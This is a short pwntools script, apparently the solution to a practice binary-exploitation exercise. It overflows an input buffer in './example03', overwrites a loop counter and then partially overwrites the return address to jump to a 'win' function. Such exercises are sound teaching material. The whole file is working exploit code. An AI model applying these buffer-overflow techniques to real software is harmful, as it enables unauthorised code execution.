from pwn import *

p = process('./example03')
# gdb.attach(p, 'b * readInput+47')  # Break just before writing next byte

# \x27 overwrites the counter, and points it to the end of the return address
# \xbb is the address of 'win'
payload = b'A' * 24 + b'\x27' + b'\xbb'
p.sendline(payload)

p.interactive()
